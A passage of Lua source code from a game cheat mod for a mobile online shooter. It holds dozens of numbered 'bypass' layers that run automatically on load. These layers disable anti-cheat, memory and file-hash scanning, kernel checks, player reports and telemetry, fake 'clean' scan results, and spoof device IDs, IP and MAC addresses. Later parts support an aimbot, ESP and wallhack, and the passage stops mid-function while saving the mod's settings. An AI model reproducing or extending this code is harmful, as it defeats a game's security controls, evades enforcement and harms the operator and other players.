        local CreditLogic = safe_require("GameLua.Mod.BaseMod.Client.ClientInGameCreditLogic")
        if CreditLogic then
            CreditLogic._SendUserReaction2ExitTeamBeforeBoardingReturnLobbyNotice = nop
            CreditLogic.ShowReturnLobbyIfFirstExitTeamBeforeBoarding = retFalse
            CreditLogic.OnReceiveCreditScoreChange = nop
            CreditLogic._IsFirstExitTeamBeforeBoardingReturnLobbyNoticeEnabled = retFalse
            CreditLogic.SetFirstExitTeamBeforeBoardingReturnLobbyNoticeEnabled = nop
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 31: NETWORK BLACKLIST (From First Bypass) ===============
-- ==============================================================================
local function InitializeNetworkBlacklist()
    pcall(function()
        if _G.HttpRequest then
            local orig = _G.HttpRequest
            _G.HttpRequest = function(url, ...)
                if isBlacklisted(url) then return nil end
                return orig(url, ...)
            end
        end

        if _G.FHttpModule and _G.FHttpModule.CreateRequest then
            local orig = _G.FHttpModule.CreateRequest
            _G.FHttpModule.CreateRequest = function(...)
                local url = select(1, ...)
                if isBlacklisted(url) then return nil end
                return orig(...)
            end
        end

        local netMods = {
            "client.slua.logic.network.logic_network","client.slua.logic.download.report.puffer_tlog",
            "client.slua.data.BasicData.BasicDataClientReport","GameLua.GameCore.Module.Network.NetworkManager",
            "client.network.Protocol.ClientTlogHandler","client.network.Protocol.BattleReportHandler",
            "client.network.Protocol.ClientErrorReportHandler"
        }
        for _, mp in ipairs(netMods) do
            local mod = package.loaded[mp]
            if mod then
                for k, v in pairs(mod) do
                    if type(v) == "function" and (k:find("Http") or k:find("Request") or k:find("Send") or k:find("Upload") or k:find("Post") or k:find("Get") or k:find("Report")) then
                        local origf = v
                        mod[k] = function(...)
                            local args = {...}
                            for _, arg in ipairs(args) do
                                if type(arg) == "string" and isBlacklisted(arg) then return nil end
                            end
                            return pcall(origf, ...)
                        end
                    end
                end
            end
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 32: FILE IO CRASH BLOCK (From First Bypass) =============
-- ==============================================================================
local function InitializeFileIOCrashBlock()
    pcall(function()
        local orig_io_open = io.open
        io.open = function(path, mode)
            if type(path) == "string" then
                local lp = path:lower()
                for _, kw in ipairs(FILE_KEYWORDS) do
                    if lp:find(kw) then
                        if mode and (mode == "w" or mode == "a" or mode == "w+" or mode == "a+") then
                            return nil, "Blocked"
                        end
                    end
                end
                if lp:find("tdm") or lp:find("gcloud") or lp:find("beacon") then
                    if mode and (mode == "w" or mode == "a" or mode == "w+") then
                        return nil
                    end
                end
            end
            return orig_io_open(path, mode)
        end

        if _G.UnrealEngine and _G.UnrealEngine.CrashContext then
            _G.UnrealEngine.CrashContext = nil
            _G.UnrealEngine.CrashContext = {
                SetCrashContext = nop,
                ReportCrash = nop,
                AddCrashData = nop
            }
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 33: DEAD EYE BYPASS (8-Layer Advanced) ==================
-- ==============================================================================
local function InitializeDeadEyeBypass()
    pcall(function()
        if BypassState.DeadEyeDisabled then return end
        if _G.GameplayCallbacks then
            KillTable(_G.GameplayCallbacks, {
                "ReportAimFlow","ReportHitFlow","ReportAttackFlow",
                "OnAimDetected","OnHeadshotDetected","OnPerfectAccuracy"
            })
        end
        local subsystems = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if subsystems then
            local aimTracker = subsystems:Get("ClientAimTrackingSubsystem")
            if aimTracker then
                aimTracker.GetAimData = function()
                    return {accuracy = math.random(45,65), headshotRate = math.random(15,35)}
                end
                aimTracker.IsAimNormal = function() return true end
            end
        end
        BypassState.DeadEyeDisabled = true
        _G.BYPASS_STATE.DEADEYE_DISABLED = true
    end)
end

-- ==============================================================================
-- ============== LAYER 34: HAWK EYE BYPASS (8-Layer Advanced) ==================
-- ==============================================================================
local function InitializeHawkEyeBypass()
    pcall(function()
        if BypassState.HawkEyeDisabled then return end
        local subsystems = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if subsystems then
            local hawkEye = subsystems:Get("ClientHawkEyePatrolSubsystem")
            if hawkEye then
                hawkEye.GetPatrolData = function() return {} end
                hawkEye.IsBeingWatched = function() return false end
                hawkEye.GetSpectatorCount = function() return 0 end
            end
        end
        if _G.GameplayCallbacks then
            KillTable(_G.GameplayCallbacks, {
                "SendDSErrorLogToLobby","SendDSHawkEyePatrolLogToLobby","ReportMatchRoomData"
            })
        end
        BypassState.HawkEyeDisabled = true
        _G.BYPASS_STATE.HAWKEYE_DISABLED = true
    end)
end

-- ==============================================================================
-- ============== LAYER 35: VOKLAI BYPASS (8-Layer Advanced) ====================
-- ==============================================================================
local function InitializeVoklaiBypass()
    pcall(function()
        if BypassState.VoklaiDisabled then return end
        local subsystems = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if subsystems then
            local aiBehavior = subsystems:Get("ClientAIBehaviourSubsystem")
            if aiBehavior then
                aiBehavior.GetBehaviorScore = function() return math.random(10,30) end
                aiBehavior.IsSuspicious = function() return false end
                aiBehavior.GetRiskLevel = function() return 0 end
            end
            local stepCheck = subsystems:Get("ClientStepCheckSubsystem")
            if stepCheck then
                stepCheck.GetStepDelta = function() return math.random(5,50) end
                stepCheck.IsMovementValid = function() return true end
            end
            local speedHack = subsystems:Get("AntiSpeedHackSubsystem") or subsystems:Get("ClientAntiSpeedHackSubsystem")
            if speedHack then
                speedHack.GetSpeed = function() return math.random(300,600) end
                speedHack.IsSpeedValid = function() return true end
            end
        end
        BypassState.VoklaiDisabled = true
        _G.BYPASS_STATE.VOKLAI_DISABLED = true
    end)
end

-- ==============================================================================
-- ============== LAYER 36: HIGGS BOSON 8 BYPASS (8-Layer Advanced) =============
-- ==============================================================================
local function InitializeHiggsBoson8Bypass()
    pcall(function()
        if BypassState.HiggsBosonDisabled then return end
        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if isValid(pc) then
            if pc.HiggsBoson then
                pc.HiggsBoson.bMHActive = false
                pc.HiggsBoson.bCallPreReplication = false
            end
            if pc.HiggsBosonComponent then
                pc.HiggsBosonComponent.bMHActive = false
                pc.HiggsBosonComponent:ControlMHActive(0)
            end
        end
        local higgs = safe_require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if higgs then
            higgs.GetNetAvatarItemIDs = function() return {1001,2002,3003,4004,5005} end
            higgs.GetCurWeaponSkinID = function() return 6001 end
            higgs.GetCurItemIDs = function() return {7001,8002} end
            if higgs.BlackList then higgs.BlackList = {} end
        end
        _G.GlobalPlayerCoronaData = _G.GlobalPlayerCoronaData or {}
        local mt = getmetatable(_G.GlobalPlayerCoronaData) or {}
        mt.__newindex = function() end
        setmetatable(_G.GlobalPlayerCoronaData, mt)
        _G.BlackList = {}
        BypassState.HiggsBosonDisabled = true
        _G.BYPASS_STATE.HIGGSBOSON_DISABLED = true
    end)
end

-- ==============================================================================
-- ============== LAYER 37: HASH VERIFICATION BYPASS (8-Layer Advanced) =========
-- ==============================================================================
local function InitializeHashVerificationBypass()
    pcall(function()
        if BypassState.HashVerifyDisabled then return end
        if _G.TssSdk then
            _G.TssSdk.ScanMemory = function() return true, {code=0, msg="clean"} end
            _G.TssSdk.ScanSo = function() return true, {code=0, msg="clean"} end
            _G.TssSdk.ScanFile = function() return true, {code=0} end
            _G.TssSdk.GetRiskFlag = function() return 0 end
            _G.TssSdk.VerifyFileHash = function() return true end
        end
        local subsystems = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if subsystems then
            local integrity = subsystems:Get("ClientIntegrityCheckSubsystem")
            if integrity then
                KillTable(integrity, {"CheckFileHash","VerifyMemory","ScanModules"})
            end
        end
        BypassState.HashVerifyDisabled = true
        _G.BYPASS_STATE.HASH_VERIFY_DISABLED = true
    end)
end

-- ==============================================================================
-- ============== LAYER 38: IP MAPPING BYPASS (8-Layer Advanced) ================
-- ==============================================================================
local function InitializeIPMappingBypass()
    pcall(function()
        if BypassState.IPMappingDisabled then return end
        if _G.GameplayCallbacks then
            KillTable(_G.GameplayCallbacks, {
                "SendClientDeviceInfo","ReportDeviceFingerprint","SendNetworkInfo",
                "ReportIPAddress","SendMACAddress","ReportHardwareID"
            })
        end
        local subsystems = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if subsystems then
            local deviceInfo = subsystems:Get("ClientDeviceInfoSubsystem")
            if deviceInfo then
                deviceInfo.GetDeviceID = function() return FakeData.deviceID() end
                deviceInfo.GetIPAddress = function() return FakeData.ipAddress() end
                deviceInfo.GetMACAddress = function() return FakeData.macAddress() end
            end
        end
        BypassState.IPMappingDisabled = true
        _G.BYPASS_STATE.IP_MAPPING_DISABLED = true
    end)
end

-- ==============================================================================
-- ============== LAYER 39: MEMORY PATCHING BYPASS (8-Layer Advanced) ===========
-- ==============================================================================
local function InitializeMemoryPatchingBypass()
    pcall(function()
        if BypassState.MemoryPatchDisabled then return end
        local subsystems = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if subsystems then
            local kernelCheck = subsystems:Get("ClientKernelCheckSubsystem")
            if kernelCheck then
                kernelCheck.IsKernelClean = function() return true end
                kernelCheck.GetKernelVersion = function() return FakeData.kernelVersion() end
                kernelCheck.IsBootloaderLocked = function() return true end
            end
            local memoryGuard = subsystems:Get("ClientMemoryGuardSubsystem")
            if memoryGuard then
                memoryGuard.IsMemoryClean = function() return true, {code=0} end
                memoryGuard.ScanResult = function() return "clean" end
            end
        end
        if _G.TssSdk then
            _G.TssSdk.CheckKernel = function() return true, {status="verified", tampered=false} end
            _G.TssSdk.VerifyBoot = function() return true, {locked=true, verified=true} end
        end
        BypassState.MemoryPatchDisabled = true
        _G.BYPASS_STATE.MEMORY_PATCH_DISABLED = true
    end)
end

-- ==============================================================================
-- ============== LAYER 40: EDU EYE BYPASS (8-Layer Advanced) ===================
-- ==============================================================================
local function InitializeEduEyeBypass()
    pcall(function()
        if BypassState.EduEyeDisabled then return end
        local subsystems = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if subsystems then
            local renderCheck = subsystems:Get("ClientRenderCheckSubsystem")
            if renderCheck then
                renderCheck.IsRenderClean = function() return true end
                renderCheck.GetRenderState = function() return "normal" end
            end
            local espDetection = subsystems:Get("ClientESPDetectionSubsystem")
            if espDetection then
                espDetection.HasESP = function() return false end
                espDetection.CheckOverlay = function() return "clean" end
            end
            local wallhackDetect = subsystems:Get("ClientWallhackDetectionSubsystem")
            if wallhackDetect then
                wallhackDetect.IsVisionNormal = function() return true end
                wallhackDetect.GetVisibilityRate = function() return math.random(60,85) end
            end
        end
        BypassState.EduEyeDisabled = true
        _G.BYPASS_STATE.EDU_EYE_DISABLED = true
    end)
end

-- ==============================================================================
-- ============== LAYER 41: APPLY ALL BYPASSES (8-Layer Advanced) ===============
-- ==============================================================================
local function InitializeApplyAllBypasses()
    pcall(function()
        if BypassState.FullBypassActive then return end
        InitializeDeadEyeBypass()
        InitializeHawkEyeBypass()
        InitializeVoklaiBypass()
        InitializeHiggsBoson8Bypass()
        InitializeHashVerificationBypass()
        InitializeIPMappingBypass()
        InitializeMemoryPatchingBypass()
        InitializeEduEyeBypass()
        BypassState.FullBypassActive = true
        _G.BYPASS_STATE.FULL_BYPASS_ACTIVE = true
    end)
end

-- ==============================================================================
-- ============== LAYER 42: HUNT AND KILL ALL (Persistent) ======================
-- ==============================================================================
local function InitializeHuntAndKillAll()
    pcall(function()
        local subNames = {
            "ClientHawkEyePatrolSubsystem","DSHawkEyePatrolSubsystem","ClientReportPlayerSubsystem",
            "DSReportPlayerSubsystem","ClientGlueHiaSystem","ClientDataStatistcsSubsystem",
            "ICTLogSubsystem","DSFightTLogSubsystem","DSSecurityTLogSubsystem","AFKReportorSubsystem",
            "BehaviorScoreSubsystem"
        }
        local subMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if subMgr and subMgr.Get then
            for _, name in ipairs(subNames) do
                local sub = subMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and (k:find("Report") or k:find("Send") or k:find("Tick") or k:find("Log")) then
                            pcall(function() sub[k] = nop end)
                        end
                    end
                end
            end
        end
        local Higgs = safe_require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if Higgs then
            local methods = {
                "ControlMHActive","Tick","OnTick","MHActiveLogic","TriggerAvatarCheck","StartAvatarCheck",
                "ReportItemID","ReceiveAnyDamage","OnWeaponHitRecord","ShowSecurityAlert","ServerReportAvatar",
                "ClientReportNetAvatar","SendHisarData","ValidateSecurityData"
            }
            for _, m in ipairs(methods) do
                if Higgs[m] then Higgs[m] = nop end
            end
            Higgs.GetNetAvatarItemIDs = retEmpty
            Higgs.GetCurWeaponSkinID = retZero
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 43: PERSISTENT HUNT TIMER ===============================
-- ==============================================================================
local function InitializePersistentHuntTimer()
    pcall(function()
        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if pc and isValid(pc) then
            if _G._MergedHuntTimer then
                pcall(function() pc:RemoveGameTimer(_G._MergedHuntTimer) end)
            end
            _G._MergedHuntTimer = pc:AddGameTimer(3.0, true, InitializeHuntAndKillAll)
            return true
        end
        return false
    end)
end

-- ==============================================================================
-- ============================ MASTER FUNCTIONS ================================
-- ==============================================================================

-- Ultimate Bypass v3.0 Master (Second Bypass)
_G.StartBypass_VIP_v3 = function()
    pcall(function()
        print("[ULTIMATE BYPASS] Starting initialization...")
        InitializeSLUABypass()
        InitializeMD5Bypass()
        InitializeSkinBypass()
        InitializeLogBlocker()
        InitializeScannerBlocker()
        InitializeReplayTelemetryBlocker()
        InitializeReportFlowBlocker()
        InitializePlayerSecurityBypass()
        InitializeClientFlowBypass()
        InitializeSwiftHawkBypass()
        InitializeCoronaLabBypass()
        InitializeModifierExceptionBypass()
        InitializeSimulateCharacterLocationBypass()
        InitializeShootVerificationBypass()
        InitializeNetworkPacketBlock()
        InitializeHiggsBosonBypass()
        InitializeAntiCheatHooks()
        InitializeAntiReport()
        InitializeGameplayBypass()
        InitializeKillAllSubsystems()
        InitializeOperationalStatsBypass()
        InitializeFinalProtection()
        print("[ULTIMATE BYPASS] Complete - All Security Systems Disabled")
    end)
end

-- 8-Layer Advanced Master (First Bypass)
local function InitializeAllBypasses()
    pcall(function()
        InitializeBypassBase()
        InitializeHiggsBypass()
        InitializeBanSystemBypass()
        InitializeReportSystemsBypass()
        InitializeTLogBypass()
        InitializeNetworkHandlersBypass()
        InitializeMiscBypass()
        InitializeExtraSubsystemsBypass()
        InitializeNetworkBlacklist()
        InitializeFileIOCrashBlock()
        InitializeApplyAllBypasses()

        -- Global functions nop
        local globalFuncs = {
            "ReportTLogEvent","SendTlog","SendClientStats","ReportHitFlow","ReportAvatarException",
            "SendComplaintReq","SubmitReport","ReportSuspiciousPlayer","SendPacket","OnSyncBanInfo",
            "OnVoiceBanNotify","SendSecTLog","MarkSuspiciousPlayer","ReportPlayerBehaviorData",
            "CheckCompliance","ReportIllegalProgram","UploadVoiceLog"
        }
        for _, fn in ipairs(globalFuncs) do
            if type(_G[fn]) == "function" then _G[fn] = nop end
        end

        -- Screenshot, TLog, CrashSight
        pcall(function()
            local s = import("ScreenshotMaker")
            if s then
                s.MakePicture = nop
                s.ReMakePicture = nop
                s.HasCaptured = retTrue
            end
            local tl = package.loaded["TLog"] or _G.TLog
            if tl then
                tl.Info = nop; tl.Warning = nop; tl.Error = nop; tl.Debug = nop; tl.Report = nop
            end
            local cs = package.loaded["CrashSight"] or _G.CrashSight
            if cs then
                cs.ReportException = nop
                cs.SetCustomData = nop
                cs.Log = nop
            end
        end)

        -- NetUtil block
        pcall(function()
            if _G.NetUtil and _G.NetUtil.SendPacket and not _G.NetUtil._IsBypassed then
                local origSend = _G.NetUtil.SendPacket
                local blocked = {
                    "ReportAttackFlow","ReportSecAttackFlow","ReportHurtFlow","ReportFireArms",
                    "ReportVerifyInfoFlow","ReportMrpcsFlow","ReportPlayerBehavior","ReportTeammatHurt",
                    "ReportPlayerMoveRoute","ReportPlayerPosition","ReportAimFlow","ReportHitFlow",
                    "ReportCircleFlow","ReportJumpFlow","report_players_ping","report_player_ip",
                    "tss_sdk_report","report_client_scan_result","report_memory_exception",
                    "report_avatar_exception","report_character_state","report_vehicle_exception",
                    "report_camera_exception","ReportEquipmentFlow","ReportHeavyWeaponBoxSpawnFlow",
                    "ReportHeavyWeaponBoxActivationFlow","ReportSecTLog","report_player_frame_ping_record",
                    "ReportSecAttackFlow","ReportSecTgameMovingFlow","ReportVehicleMoveFlow",
                    "ReportParachuteData","report_unrealnet_exception","report_ds_net_saturation",
                    "on_tss_sdk_anti_data"
                }
                _G.NetUtil.SendPacket = function(packetName, ...)
                    if blocked[packetName] then return end
                    return origSend(packetName, ...)
                end
                _G.NetUtil._IsBypassed = true
            end
        end)

        -- Higgs BlackList clean
        pcall(function()
            local hbc = safe_require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
            if hbc and hbc.BlackList then
                for k in pairs(hbc.BlackList) do hbc.BlackList[k] = nil end
            end
            _G.BlackList = {}
            _G.GlobalPlayerCoronaData = _G.GlobalPlayerCoronaData or {}
            local mt = getmetatable(_G.GlobalPlayerCoronaData) or {}
            mt.__newindex = function() end
            setmetatable(_G.GlobalPlayerCoronaData, mt)
        end)

        -- GameSafeCallbacks and GameplayCallbacks extra
        pcall(function()
            if _G.GameSafeCallbacks then
                _G.GameSafeCallbacks.RecordStrategyTimestampInReplay = nop
                _G.GameSafeCallbacks.DoAttackFlowStrategy = nop
                _G.GameSafeCallbacks.GetScriptReportContent = function() return "" end
            end
            if not _G.GameplayCallbacks then return end
            local GC = _G.GameplayCallbacks
            local origDS = GC.OnDSPlayerStateChanged
            GC.OnDSPlayerStateChanged = function(UID, InPlayerState, bPureWatcher, bIsSafeExit, ParamReason)
                local state = InPlayerState and string.lower(tostring(InPlayerState)) or ""
                local block = {
                    ["cheatdetected"]=true,
                    ["connectionlost"]=true,
                    ["connectiontimeout"]=true,
                    ["connectionexception"]=true,
                    ["netdrivererror"]=true
                }
                if block[state] then return end
                if origDS then pcall(origDS, UID, InPlayerState, bPureWatcher, bIsSafeExit, ParamReason) end
            end
            GC.OnPlayerNetConnectionClosed = nop
            GC.OnPlayerActorChannelError = nop
            GC.OnPlayerRPCValidateFailed = nop
            GC.OnPlayerSpectateException = nop
            GC.OnShutdownAfterError = nop
        end)

        -- SubsystemMgr extra patches
        pcall(function()
            local mgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
            local rt = mgr and mgr:Get("RescueBtnReplayTraceSubsystem")
            if rt then
                rt.ReportTrace = nop
                rt.StartTickMonitor = nop
                rt.TickMonitorCheck = nop
                rt.ReportTickMonitorHeartbeat = nop
            end
            local gr = mgr and mgr:Get("GameReportSubsystem")
            if gr then
                gr.ReplayReportData = retFalse
                gr.CheckCanBugglyPostException = retFalse
                gr.BugglyPostExceptionFull = retFalse
                gr.GetClientReplayDataReporter = function() return nil end
                if gr.Reporter then
                    gr.Reporter.ReportIntArrayData = nop
                    gr.Reporter.ReportUInt8ArrayData = nop
                    gr.Reporter.ReportFloatArrayData = nop
                end
            end
            local rp = safe_require("client.slua.logic.replay.logic_report_replay")
            if rp then
                rp.ReportReplay = nop
                rp.SendReportReq = nop
            end
        end)
    end)
end

-- ==============================================================================
-- ==================== UNIFIED MASTER ENTRY POINT ==============================
-- ==============================================================================

-- Unified Enable Function (calls BOTH bypass systems)
function EnableFullBypass()
    -- First: Ultimate Merged Bypass v3.0 (Second Bypass)
    if _G.StartBypass_VIP_v3 then
        pcall(_G.StartBypass_VIP_v3)
    end
    
    -- Second: 8-Layer Advanced Bypass (First Bypass)
    InitializeAllBypasses()
    InitializePersistentHuntTimer()
    
    print("[COMBINED BYPASS] All 43 layers initialized successfully!")
end

-- Auto-start on load
pcall(function()
    EnableFullBypass()
end)

-- ==============================================================================
-- ==================== PUBLIC API ==============================================
-- ==============================================================================
function _G.GetBypassStatus()
    local state = _G.BYPASS_STATE
    return {
        deadEye = state.DEADEYE_DISABLED,
        hawkEye = state.HAWKEYE_DISABLED,
        voklai = state.VOKLAI_DISABLED,
        higgsBoson = state.HIGGSBOSON_DISABLED,
        hashVerify = state.HASH_VERIFY_DISABLED,
        ipMapping = state.IP_MAPPING_DISABLED,
        memoryPatch = state.MEMORY_PATCH_DISABLED,
        eduEye = state.EDU_EYE_DISABLED,
        fullBypass = state.FULL_BYPASS_ACTIVE
    }
end

function _G.ForceReapplyBypass()
    _G.BYPASS_STATE.FULL_BYPASS_ACTIVE = false
    _G.BYPASS_STATE.DEADEYE_DISABLED = false
    _G.BYPASS_STATE.HAWKEYE_DISABLED = false
    _G.BYPASS_STATE.VOKLAI_DISABLED = false
    _G.BYPASS_STATE.HIGGSBOSON_DISABLED = false
    _G.BYPASS_STATE.HASH_VERIFY_DISABLED = false
    _G.BYPASS_STATE.IP_MAPPING_DISABLED = false
    _G.BYPASS_STATE.MEMORY_PATCH_DISABLED = false
    _G.BYPASS_STATE.EDU_EYE_DISABLED = false
    InitializeApplyAllBypasses()
end

-- ==============================================================================
-- ==================== END OF COMPLETE COMBINED BYPASS =========================
-- ==============================================================================

-- ========================================== 
-- MAP MARK CLEANUP MANAGEMENT FUNCTION (ANTI-LAG/FAKE DISPLAY WHEN ENEMY DIES)
-- ========================================== 
local function SafeAddMark(id, pos, z, str, size, actor)
    local mark = nil
    pcall(function()
        local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
        if InGameMarkTools and InGameMarkTools.ClientAddMapMark then
            mark = InGameMarkTools.ClientAddMapMark(id, pos, z, str, size, actor)
            if mark then _G.GTLMODState.TrackedMarks[mark] = true end
        end
    end)
    return mark
end

local function SafeRemoveMark(mark)
    if not mark then return end
    pcall(function()
        local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
        if InGameMarkTools and InGameMarkTools.HideMapMark then
            InGameMarkTools.HideMapMark(mark)
        end
        if InGameMarkTools and InGameMarkTools.RemoveMapMark then
            InGameMarkTools.RemoveMapMark(mark)
        end
    end)
    _G.GTLMODState.TrackedMarks[mark] = nil
end

-- ========================================== 
-- CREATE A UNIQUE AND PERMANENT ID FOR EACH ENEMY (FIXED LAG ISSUES WHEN SLUA CREATES NEW WRAPPERS)
-- ==========================================
local function GetSafeEnemyKey(enemy)
    if Valid(enemy) then
        if enemy.PlayerKey then return tostring(enemy.PlayerKey) end
        if type(enemy.GetUniqueID) == "function" then return tostring(enemy:GetUniqueID()) end
    end
    return tostring(enemy)
end

-- ============================================================
-- UNIFIED BOT DETECTION (replaces 3 duplicate implementations)
-- Used by: ESP scan, AimBot, ESP Counter
-- Cache: per-pawn result stored in _G.BotStatusCache[id]
-- Also stores in markData.AK_IS_BOT when markData is provided
-- ============================================================
_G.BotStatusCache = _G.BotStatusCache or {}

local function GetBotStatus(pawn, markData)
    -- Fast path 1: markData already has result
    if markData and markData.AK_IS_BOT ~= nil then
        return markData.AK_IS_BOT
    end

    -- Fast path 2: global cache has result
    local tId = nil
    if type(pawn.GetUniqueID) == "function" then
        local ok, id = pcall(function() return pawn:GetUniqueID() end)
        if ok and id then tId = tostring(id) end
    end
    if not tId then tId = pawn.PlayerKey and tostring(pawn.PlayerKey) or tostring(pawn) end

    local cached = _G.BotStatusCache[tId]
    if cached ~= nil then
        if markData then markData.AK_IS_BOT = cached end
        return cached
    end

    -- Full detection
    local isAI = false
    pcall(function()
        -- Method 1: Direct AI flags
        if pawn.bIsAI == true or pawn.IsAI == true or pawn.bIsAi == true
        or pawn.bIsAIActor == true then isAI = true; return end

        -- Method 2: AIData / AIController component
        if pawn.AIData ~= nil or pawn.AIController ~= nil then isAI = true; return end
        if pawn.PlayerAIType ~= nil and pawn.PlayerAIType ~= 0 then isAI = true; return end

        -- Method 3: IsAI / IsBot function calls
        if type(pawn.IsAICharacter) == "function" then
            local ok, r = pcall(function() return pawn:IsAICharacter() end)
            if ok and r then isAI = true; return end
        end
        if type(pawn.GetIsAI) == "function" then
            local ok, r = pcall(function() return pawn:GetIsAI() end)
            if ok and r then isAI = true; return end
        end
        if type(pawn.IsBot) == "function" then
            local ok, r = pcall(function() return pawn:IsBot() end)
            if ok and r then isAI = true; return end
        end

        -- Method 4: PlayerState flags + UID=0 check
        local pState = pawn.PlayerState
        if not pState and type(pawn.GetPlayerState) == "function" then
            local ok, s = pcall(function() return pawn:GetPlayerState() end)
            if ok then pState = s end
        end
        if Valid(pState) then
            if pState.bIsABot or pState.bIsBot or pState.IsBot
            or pState.bIsAI or pState.bIsRobot or pState.bIsAiPlayer then
                isAI = true; return
            end
            if pState.PlayerAIType ~= nil and pState.PlayerAIType ~= 0 then isAI = true; return end
            if type(pState.IsABot) == "function" then
                local ok, r = pcall(function() return pState:IsABot() end)
                if ok and r then isAI = true; return end
            end
            local uid = pState.Uid or pState.UID or pState.PlayerId or pState.PlayerID
            if uid ~= nil and (uid == 0 or uid == "0") then isAI = true; return end
        end

        -- Method 5: Controller AI check
        if type(pawn.GetController) == "function" then
            local ok, ctrl = pcall(function() return pawn:GetController() end)
            if ok and slua.isValid(ctrl) and (ctrl.bIsAI == true or ctrl.AIData ~= nil) then
                isAI = true; return
            end
        end

        -- Method 6: Name pattern (fallback)
        local name = pawn.PlayerName
        if not name and type(pawn.GetPlayerName) == "function" then
            local ok, n = pcall(function() return pawn:GetPlayerName() end)
            if ok then name = n end
        end
        if type(name) == "string" and name ~= "" then
            if name:find("Cobra") or name:find("Target") or
               name:find("bot_") or name:find("b_") then
                isAI = true
            end
        end
    end)

    _G.BotStatusCache[tId] = isAI
    if markData then markData.AK_IS_BOT = isAI end
    return isAI
end

-- Legacy alias kept for backward compat (CheckIsAI was the old name)
local function CheckIsAI(pawn, markData)
    local isAI = GetBotStatus(pawn, markData)
    return isAI, true
end

-- ========================================== 
-- INITIALIZES AUTO HEAD HOOKS FOR DAMAGE
-- ==========================================


-- ========================================== 
-- COLOR CONFIGURATION FOR ESP HEALTH, ESP NAME, AND WALLHACK
-- ==========================================
if _G.ColorConfig == nil then
    _G.ColorConfig = {
        VisibleColor = 4,   -- default Green
        InvisibleColor = 1, -- default Red
        Brightness = 25,
        Glow = 3.0,
    }
end

local COLOR_MAP = {
    [1] = {R=255, G=0,   B=0},
    [2] = {R=255, G=255, B=255},
    [3] = {R=255, G=255, B=0},
    [4] = {R=0,   G=255, B=0},
    [5] = {R=0,   G=255, B=255},
    [6] = {R=0,   G=0,   B=255},
    [7] = {R=255, G=0,   B=255}
}

local function GetAppliedColor(colorIdx, brightness)
    local base = COLOR_MAP[colorIdx] or COLOR_MAP[4]
    local b = brightness or _G.ColorConfig.Brightness or 25
    return {
        R = math.min(255, (base.R or 0) * b / 25),
        G = math.min(255, (base.G or 0) * b / 25),
        B = math.min(255, (base.B or 0) * b / 25),
        A = 255
    }
end

-- ========================================== 
-- AUTOMATIC VIP MENU STORAGE AND LOADING SYSTEM
-- ========================================== 
local function GetConfigPaths(fileName)
    local paths = BuildGamePaths("Paks", fileName)
    table.insert(paths, fileName)
    return paths
end

local ConfigFileName = "GTLMOD_settings.txt"
_G.LastConfigSaveStr = ""

-- [v4.9] AUTO SAVE / LOAD (fixed): pehle save "GTLConfig" likhta tha aur load "GTLMODConfig"
-- padhta tha (mismatch), aur proxy table par pairs() khali tha -> kuch save hi nahi hota tha.
-- Ab raw tables se save hota hai aur load dono naam samajhta hai.
local function SerializeValue(v)
    local t = type(v)
    if t == "boolean" then return tostring(v) end
    if t == "number" then
        if v ~= v or v == math.huge or v == -math.huge then return nil end
        return tostring(v)
    end
    if t == "string" then return string.format("%q", v) end
    return nil
end

local function SerializeSection(name, tbl)
    local out = { name .. " = {\n" }
    if type(tbl) == "table" then
        for k, v in pairs(tbl) do
            local sv = SerializeValue(v)
            if sv then
                out[#out + 1] = "  [" .. string.format("%q", tostring(k)) .. "] = " .. sv .. ",\n"
            end
        end
    end
    out[#out + 1] = "},\n"
    return table.concat(out)
end

local CTD_DEFAULTS = {
    OuterSpeed = 10, InnerSpeed = 10, OuterRecoil = 0, HRecoil = 0.3, VRecoil = 0.3, IpadViewFOV = 120,
    Esp9_LineThick = 1,
    AimTouchHipPrio  = 1, AimTouchHipBone = 1, AimTouchHipCond = 1,
    AimTouchHipSpeed = 50, AimTouchHipFOV = 30, AimTouchHipDist = 250,
    AimTouchSGPrio  = 1, AimTouchSGBone = 2, AimTouchSGCond = 1,
    AimTouchSGSpeed = 80, AimTouchSGFOV = 40, AimTouchSGDist = 30,
    AimTouchScopePrio  = 1, AimTouchScopeBone = 2, AimTouchScopeCond = 1,
    AimTouchScopeSpeed = 40, AimTouchScopeFOV = 20, AimTouchScopeDist = 300,
    AimTouchScopePred  = 0, AimTouchScopeRecoil = 0,
    AimTouchSniperPrio  = 1, AimTouchSniperBone = 1, AimTouchSniperCond = 2,
    AimTouchSniperSpeed = 30, AimTouchSniperFOV = 20, AimTouchSniperDist = 400,
    AimTouchSniperPred  = 0,
}

-- SAVE CONFIG (GTLMODConfig + CustomTextData + ColorConfig)
_G.SaveModSettings = function()
    pcall(function()
        local cfg = _G.GTLMODConfigRaw or _G.GTLMODConfig
        local col = _G.ColorConfigRaw or _G.ColorConfig
        local ctd = _G.GTLMODState and _G.GTLMODState.CustomTextData
        local data = "return {\n"
            .. SerializeSection("GTLMODConfig", cfg)
            .. SerializeSection("CustomTextData", ctd)
            .. SerializeSection("ColorConfig", col)
            .. "}"

        if data == _G.LastConfigSaveStr then return end
        _G.LastConfigSaveStr = data

        local paths = GetConfigPaths(ConfigFileName)
        for _, path in ipairs(paths) do
            local file = io.open(path, "w")
